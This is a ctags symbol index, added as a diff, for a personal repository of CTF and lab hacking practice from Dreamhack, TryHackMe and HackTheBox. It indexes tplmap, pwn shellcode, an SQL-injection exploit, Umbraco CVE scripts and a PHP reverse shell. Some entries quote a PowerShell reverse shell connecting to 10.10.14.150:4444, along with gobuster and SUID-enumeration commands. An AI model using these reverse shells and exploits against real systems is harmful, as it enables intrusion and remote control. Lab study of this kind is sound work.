+_get_detection_obj_data	dreamhackctf/login-1/tplmap/tests/basetest.py	/^    def _get_detection_obj_data(self, url, level = 0, closure_level = 0, technique = 'RT'):$/;"	m	class:BaseTest
+_get_expected_delay	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _get_expected_delay(self):$/;"	m	class:Plugin
+_markHttpMessage	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def _markHttpMessage( self, requestResponse, injection, responseMarkString ):$/;"	m	class:ScanIssue
+_okng	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^        _okng = lambda f: 'OK' if f else 'NG'$/;"	f	member:ScanIssue.getIssueDetail	file:
+_parse_cookies	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_cookies(self):$/;"	m	class:Channel
+_parse_get	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_get(self, all_injectable = False):$/;"	m	class:Channel
+_parse_header	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_header(self, all_injectable = False):$/;"	m	class:Channel
+_parse_method	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_method(self):$/;"	m	class:Channel
+_parse_post	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_post(self, all_injectable = False):$/;"	m	class:Channel
+_parse_url	dreamhackctf/login-1/tplmap/core/channel.py	/^    def _parse_url(self):$/;"	m	class:Channel
+_print_injection_summary	dreamhackctf/login-1/tplmap/core/checks.py	/^def _print_injection_summary(channel):$/;"	f
+_recursive_update	dreamhackctf/login-1/tplmap/core/plugin.py	/^def _recursive_update(d, u):$/;"	f
+_start	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh.s	/^_start:$/;"	l
+_start	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh2.s	/^_start:$/;"	l
+_start	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh3.s	/^_start:$/;"	l
+_start	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh4.s	/^_start:$/;"	l
+access_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^access_key =$/;"	k	section:external_image_storage.s3
+account_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^account_key =$/;"	k	section:external_image_storage.azure_blob
+account_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^account_name =$/;"	k	section:external_image_storage.azure_blob
+active_sync_enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^active_sync_enabled = true$/;"	k	section:auth.ldap
+address	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^address =$/;"	k	section:log.syslog
+address	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^address =$/;"	k	section:metrics.graphite
+address	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^address =$/;"	k	section:tracing.jaeger
+admin	dreamhackctf/login-1/app.py	/^def admin():$/;"	f
+admin01	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^admin01:x:1000:1000:admin01,,,:\/home\/admin01:\/bin\/bash$/;"	u	home:/home/admin01	shell:/bin/bash
+admin_password	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^admin_password = admin$/;"	k	section:security
+admin_user	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^admin_user = admin$/;"	k	section:security
+ahnlab	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^ahnlab:x:1002:1002:,,,:\/home\/ahnlab:\/bin\/bash$/;"	u	home:/home/ahnlab	shell:/bin/bash
+alerting	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[alerting]$/;"	s
+allow_embedding	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_embedding = false$/;"	k	section:security
+allow_org_create	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_org_create = false$/;"	k	section:users
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = false$/;"	k	section:users
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.generic_oauth
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.github
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.gitlab
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.google
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.grafana_com
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.grafananet
+allow_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allow_sign_up = true$/;"	k	section:auth.ldap
+allowed_domains	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_domains =$/;"	k	section:auth.generic_oauth
+allowed_domains	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_domains =$/;"	k	section:auth.github
+allowed_domains	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_domains =$/;"	k	section:auth.gitlab
+allowed_domains	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_domains =$/;"	k	section:auth.google
+allowed_groups	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_groups =$/;"	k	section:auth.gitlab
+allowed_organizations	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_organizations =$/;"	k	section:auth.generic_oauth
+allowed_organizations	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_organizations =$/;"	k	section:auth.github
+allowed_organizations	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_organizations =$/;"	k	section:auth.grafana_com
+allowed_organizations	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^allowed_organizations =$/;"	k	section:auth.grafananet
+always_included_tag	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^always_included_tag =$/;"	k	section:tracing.jaeger
+analytics	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[analytics]$/;"	s
+api_key_max_seconds_to_live	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^api_key_max_seconds_to_live = -1$/;"	k	section:auth
+api_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^api_url = https:\/\/api.github.com\/user$/;"	k	section:auth.github
+api_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^api_url = https:\/\/gitlab.com\/api\/v4$/;"	k	section:auth.gitlab
+api_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^api_url = https:\/\/www.googleapis.com\/oauth2\/v1\/userinfo$/;"	k	section:auth.google
+api_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^api_url =$/;"	k	section:auth.generic_oauth
+app	dreamhackctf/cookie/app.py	/^app = Flask(__name__)$/;"	v
+app	dreamhackctf/login-1/app.py	/^app = Flask(__name__)$/;"	v
+app	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var app = connect();$/;"	v
+app	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^app = Flask(__name__)$/;"	v
+app	dreamhackctf/simple_sqli/app.py	/^app = Flask(__name__)$/;"	v
+app_mode	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^app_mode = production$/;"	k
+app_tls_skip_verify_insecure	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^app_tls_skip_verify_insecure = false$/;"	k	section:plugins
+args	thm/Simple_CTF/46635.py	/^options, args = parser.parse_args()$/;"	v
+args	thm/Simple_CTF/46635.py.bak	/^options, args = parser.parse_args()$/;"	v
+argvs	study_hacked/system_tip/pwntools_usage/auto_overflow_exploit.py	/^argvs = [str(i) for i in range(2)]$/;"	v
+ascii_lowercase	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^    from string import lowercase as ascii_lowercase$/;"	x
+assertion_attribute_email	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^assertion_attribute_email = mail$/;"	k	section:auth.saml
+assertion_attribute_login	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^assertion_attribute_login = mail$/;"	k	section:auth.saml
+assertion_attribute_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^assertion_attribute_name = displayName$/;"	k	section:auth.saml
+auth	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth]$/;"	s
+auth.anonymous	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.anonymous]$/;"	s
+auth.basic	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.basic]$/;"	s
+auth.generic_oauth	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.generic_oauth]$/;"	s
+auth.github	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.github]$/;"	s
+auth.gitlab	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.gitlab]$/;"	s
+auth.google	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.google]$/;"	s
+auth.grafana_com	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.grafana_com]$/;"	s
+auth.grafananet	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.grafananet]$/;"	s
+auth.ldap	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.ldap]$/;"	s
+auth.proxy	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.proxy]$/;"	s
+auth.saml	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[auth.saml] # Enterprise only$/;"	s
+auth_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auth_url = https:\/\/accounts.google.com\/o\/oauth2\/auth$/;"	k	section:auth.google
+auth_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auth_url = https:\/\/github.com\/login\/oauth\/authorize$/;"	k	section:auth.github
+auth_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auth_url = https:\/\/gitlab.com\/oauth\/authorize$/;"	k	section:auth.gitlab
+auth_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auth_url =$/;"	k	section:auth.generic_oauth
+auto_assign_org	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auto_assign_org = true$/;"	k	section:users
+auto_assign_org_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auto_assign_org_id = 1$/;"	k	section:users
+auto_assign_org_role	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auto_assign_org_role = Viewer$/;"	k	section:users
+auto_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^auto_sign_up = true$/;"	k	section:auth.proxy
+backup	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^backup:x:34:34:backup:\/var\/backups:\/bin\/sh$/;"	u	home:/var/backups	shell:/bin/sh
+banner	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^banner = """Tplmap %s$/;"	v
+base64decode	dreamhackctf/login-1/tplmap/utils/strings.py	/^def base64decode(data):$/;"	f
+base64encode	dreamhackctf/login-1/tplmap/utils/strings.py	/^def base64encode(data):$/;"	f
+base_path	dreamhackctf/login-1/tplmap/utils/config.py	/^base_path = os.path.expanduser(config["base_path"])$/;"	v
+basic_auth_password	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^basic_auth_password =$/;"	k	section:metrics
+basic_auth_username	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^basic_auth_username =$/;"	k	section:metrics
+basic_net_info	thm/The_Cod_Caper/linpeas.sh	/^basic_net_info(){$/;"	f
+beautify_print	thm/Simple_CTF/46635.py	/^def beautify_print():$/;"	f
+beautify_print	thm/Simple_CTF/46635.py.bak	/^def beautify_print():$/;"	f
+beautify_print_try	thm/Simple_CTF/46635.py	/^def beautify_print_try(value):$/;"	f
+beautify_print_try	thm/Simple_CTF/46635.py.bak	/^def beautify_print_try(value):$/;"	f
+bin	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^bin:x:2:2:bin:\/bin:\/bin\/sh$/;"	u	home:/bin	shell:/bin/sh
+bind_shell	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def bind_shell(self, port, shell = "\/bin\/sh"):$/;"	m	class:Plugin
+bind_shell	dreamhackctf/login-1/tplmap/plugins/languages/bash.py	/^bind_shell = [$/;"	v
+binsh_addr	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^binsh_addr = libc_base + binsh_rel$/;"	v
+binsh_rel	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^binsh_rel = 0x160a24$/;"	v
+blind	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def blind(engine):$/;"	f
+blind_detected	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def blind_detected(self):$/;"	m	class:Plugin
+blind_detected	dreamhackctf/login-1/tplmap/plugins/engines/dust.py	/^    def blind_detected(self):$/;"	m	class:Dust
+blind_detected	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^    def blind_detected(self):$/;"	m	class:Java
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    blind_tests = [$/;"	v	class:FreemarkerTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    blind_tests = [$/;"	v	class:VelocityTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    blind_tests = [$/;"	v	class:DotTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    blind_tests = [$/;"	v	class:DustTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    blind_tests = [$/;"	v	class:EjsTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    blind_tests = [$/;"	v	class:JavascriptTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    blind_tests = [$/;"	v	class:MarkoTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    blind_tests = [$/;"	v	class:NunjucksTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    blind_tests = [$/;"	v	class:PugTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    blind_tests = [$/;"	v	class:PhpTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    blind_tests = [$/;"	v	class:SmartySecuredTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    blind_tests = [$/;"	v	class:SmartyUnsecuredTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    blind_tests = [$/;"	v	class:TwigSecuredTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    blind_tests = [$/;"	v	class:TwigUnsecuredTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    blind_tests = [$/;"	v	class:Jinja2Test
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    blind_tests = [$/;"	v	class:MakoTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    blind_tests = [$/;"	v	class:PythonTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    blind_tests = [$/;"	v	class:TornadoTest
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    blind_tests = [$/;"	v	class:ErbTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    blind_tests = [$/;"	v	class:RubyTests
+blind_tests	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    blind_tests = [$/;"	v	class:SlimTests
+boo	study_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int boo() {$/;"	f	typeref:typename:int
+bt	htb/Remote/mini-reverse.ps1	/^$sm=(New-Object Net.Sockets.TCPClient('10.10.14.150',4444)).GetStream();[byte[]]$bt=0..65535|%{0/;"	v
+bucket	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^bucket =$/;"	k	section:external_image_storage.gcs
+bucket	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^bucket =$/;"	k	section:external_image_storage.s3
+bucket_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^bucket_url =$/;"	k	section:external_image_storage.s3
+buf	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh.s	/^buf:$/;"	l
+buf	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh2.s	/^buf:$/;"	l
+buf	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh3.s	/^buf:$/;"	l
+buffer	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/bof3.c	/^char buffer[32];$/;"	v	typeref:typename:char[32]
+buffer	study_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04.c	/^char buffer[32];$/;"	v	typeref:typename:char[32]
+bytes	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+ca_cert_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^ca_cert_path =$/;"	k	section:database
+cache_mode	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cache_mode = private$/;"	k	section:database
+callback_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^callback_url =$/;"	k	section:rendering
+cert_file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cert_file =$/;"	k	section:server
+cert_file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cert_file =$/;"	k	section:smtp
+cert_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cert_key =$/;"	k	section:server
+certificate	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^certificate =$/;"	k	section:auth.saml
+certificate_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^certificate_path =$/;"	k	section:auth.saml
+check_authentication	study_hacked/system_tip/pwntools_usage/auto_overflow.c	/^int check_authentication(char * password) {$/;"	f	typeref:typename:int
+check_for_updates	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^check_for_updates = true$/;"	k	section:analytics
+check_if_su_brute	thm/The_Cod_Caper/linpeas.sh	/^check_if_su_brute(){$/;"	f
+check_template_injection	dreamhackctf/login-1/tplmap/core/checks.py	/^def check_template_injection(channel):$/;"	f
+chunk_size	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$chunk_size = 1400;$/;"	v
+chunkit	dreamhackctf/login-1/tplmap/utils/strings.py	/^def chunkit( seq, n ):$/;"	f
+client	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+client_cert_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_cert_path =$/;"	k	section:database
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_client_id$/;"	k	section:auth.google
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_id$/;"	k	section:auth.generic_oauth
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_id$/;"	k	section:auth.github
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_id$/;"	k	section:auth.gitlab
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_id$/;"	k	section:auth.grafana_com
+client_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_id = some_id$/;"	k	section:auth.grafananet
+client_key_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_key_path =$/;"	k	section:database
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_client_secret$/;"	k	section:auth.google
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_secret$/;"	k	section:auth.generic_oauth
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_secret$/;"	k	section:auth.github
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_secret$/;"	k	section:auth.gitlab
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_secret$/;"	k	section:auth.grafana_com
+client_secret	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^client_secret = some_secret$/;"	k	section:auth.grafananet
+close_connection	dreamhackctf/login-1/app.py	/^def close_connection(exception):$/;"	f
+close_connection	dreamhackctf/simple_sqli/app.py	/^def close_connection(exception):$/;"	f
+close_dict	dreamhackctf/login-1/tplmap/utils/closures.py	/^close_dict = [ '}', ':1}' ]$/;"	v
+close_function	dreamhackctf/login-1/tplmap/utils/closures.py	/^close_function = [ ')' ]$/;"	v
+close_list	dreamhackctf/login-1/tplmap/utils/closures.py	/^close_list = [ ']' ]$/;"	v
+close_single_duble_quotes	dreamhackctf/login-1/tplmap/utils/closures.py	/^close_single_duble_quotes = [ '1\\'', '1"' ]$/;"	v
+close_triple_quotes	dreamhackctf/login-1/tplmap/utils/closures.py	/^close_triple_quotes = [ '1"""' ]$/;"	v
+command  : gobuster dir -u http://10.10.19.165:3333 -w directory_guessing_list.txt	thm/Vulnversity/gobusterResult.md	/^## command  : gobuster dir -u http:\/\/10.10.19.165:3333 -w directory_guessing_list.txt$/;"	s	chapter:Directory Tree Scan
+command : find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null	thm/Vulnversity/PriVilegeList.md	/^## command : find \/ -user root -perm -4000 -exec ls -ldb {} \\; 2>\/dev\/null$/;"	s	chapter:TITLE :  PrivilegeList
+command : gobuster dir -u http://10.10.19.165:3333/internal/ -w directory_guessing_list.txt	thm/Vulnversity/gobusterResult.md	/^## command : gobuster dir -u http:\/\/10.10.19.165:3333\/internal\/ -w directory_guessing_list.t/;"	s	chapter:File Upload Point
+concurrent_render_limit	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^concurrent_render_limit = 5$/;"	k	section:alerting
+config	dreamhackctf/login-1/tplmap/utils/config.py	/^config = None$/;"	v
+config_file	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^config_file = \/etc\/grafana\/ldap.toml$/;"	k	section:auth.ldap
+config_folder	dreamhackctf/login-1/tplmap/utils/config.py	/^config_folder = os.path.dirname(os.path.realpath(__file__))$/;"	v
+conn_max_lifetime	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^conn_max_lifetime = 14400$/;"	k	section:database
+connect	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var connect = require('connect');$/;"	v
+connect	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^def connect(ip, port):$/;"	f
+connect	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^def connect(ip, port):$/;"	f
+connect	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^def connect(ip, port):$/;"	f
+connect_socket	dreamhackctf/login-1/tplmap/core/tcpserver.py	/^    def connect_socket(self):$/;"	m	class:TcpServer
+connstr	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^connstr =$/;"	k	section:remote_cache
+consolidateDuplicateIssues	dreamhackctf/login-1/tplmap/burp_extension/scanner_check.py	/^    def consolidateDuplicateIssues( self, existingIssue, newIssue ):$/;"	m	class:ScannerCheck
+container_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^container_name =$/;"	k	section:external_image_storage.azure_blob
+cookie_samesite	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cookie_samesite = lax$/;"	k	section:security
+cookie_secure	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^cookie_secure = false$/;"	k	section:security
+crack_password	thm/Simple_CTF/46635.py	/^def crack_password():$/;"	f
+crack_password	thm/Simple_CTF/46635.py.bak	/^def crack_password():$/;"	f
+ctx_closures	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^ctx_closures = {$/;"	v
+ctx_closures	dreamhackctf/login-1/tplmap/plugins/languages/javascript.py	/^ctx_closures = {$/;"	v
+ctx_closures	dreamhackctf/login-1/tplmap/plugins/languages/php.py	/^ctx_closures = {$/;"	v
+ctx_closures	dreamhackctf/login-1/tplmap/plugins/languages/python.py	/^ctx_closures = {$/;"	v
+d	htb/Remote/mini-reverse.ps1	/^$sm=(New-Object Net.Sockets.TCPClient('10.10.14.150',4444)).GetStream();[byte[]]$bt=0..65535|%{0/;"	v
+daemon	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^daemon:x:1:1:daemon:\/usr\/sbin:\/bin\/sh$/;"	u	home:/usr/sbin	shell:/bin/sh
+daemon	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^	$daemon = 1;$/;"	v
+daemon	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$daemon = 0;$/;"	v
+daily_rotate	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^daily_rotate = true$/;"	k	section:log.file
+dashboards	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[dashboards]$/;"	s
+data	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^data = data$/;"	k	section:paths
+data	htb/Remote/Gaining/umbraco_cve1.py	/^data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":V/;"	v
+data	htb/Remote/Gaining/umbraco_cve2.py	/^data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":V/;"	v
+data	htb/Remote/Gaining/umbraco_cve3.py	/^data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":V/;"	v
+data	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+data_source_proxy_whitelist	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^data_source_proxy_whitelist =$/;"	k	section:security
+database	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[database]$/;"	s
+dataproxy	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[dataproxy]$/;"	s
+db	dreamhackctf/simple_sqli/app.py	/^    db = sqlite3.connect(DATABASE)$/;"	v
+db_name	thm/Simple_CTF/46635.py	/^db_name = ""$/;"	v
+db_name	thm/Simple_CTF/46635.py.bak	/^db_name = ""$/;"	v
+debug	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$debug = 0;$/;"	v
+decodeToBase64	thm/Advent_of_Cyber/Day6/decodeAnyencode.py	/^def decodeToBase64(msg):$/;"	f
+decodeToHex	thm/Advent_of_Cyber/Day6/decodeAnyencode.py	/^def decodeToHex(msg):$/;"	f
+default	dreamhackctf/login-1/tplmap/core/clis.py	/^    def default(self, line):$/;"	m	class:MultilineShell
+default	dreamhackctf/login-1/tplmap/core/clis.py	/^    def default(self, line):$/;"	m	class:Shell
+default_theme	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^default_theme = dark$/;"	k	section:users
+delay	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def delay(seconds = 1):$/;"	f
+delete	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def delete(self, key):$/;"	m	class:Plugin
+descriptorspec	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$descriptorspec = array($/;"	v
+detect	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def detect(self):$/;"	m	class:Plugin
+detect	dreamhackctf/login-1/tplmap/plugins/engines/dust.py	/^    def detect(self):$/;"	m	class:Dust
+detect_read	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def detect_read(self):$/;"	m	class:Plugin
+detect_template_injection	dreamhackctf/login-1/tplmap/core/checks.py	/^def detect_template_injection(channel, plugins = plugins):$/;"	f
+detected	dreamhackctf/login-1/tplmap/burp_extension/channel.py	/^    def detected( self, technique, detail ):$/;"	m	class:Channel
+detected	dreamhackctf/login-1/tplmap/core/channel.py	/^    def detected( self, technique, detail ):$/;"	m	class:Channel
+detection	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^detection = OptionGroup(parser, "Detection" , "These options can be used to customize the detect/;"	v
+dev	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^dev:x:1001:1001:,,,:\/home\/dev:\/bin\/bash$/;"	u	home:/home/dev	shell:/bin/bash
+dictionary	thm/Simple_CTF/46635.py	/^dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'$/;"	v
+dictionary	thm/Simple_CTF/46635.py.bak	/^dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'$/;"	v
+directory	dreamhackctf/php-1/list.php	/^    $directory = '..\/uploads\/';$/;"	v
+disable_brute_force_login_protection	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_brute_force_login_protection = false$/;"	k	section:security
+disable_gravatar	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_gravatar = false$/;"	k	section:security
+disable_initial_admin_creation	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_initial_admin_creation = false$/;"	k	section:security
+disable_login_form	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_login_form = false$/;"	k	section:auth
+disable_sanitize_html	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_sanitize_html = false$/;"	k	section:panels
+disable_shared_zipkin_spans	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_shared_zipkin_spans = false$/;"	k	section:tracing.jaeger
+disable_signout_menu	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_signout_menu = false$/;"	k	section:auth
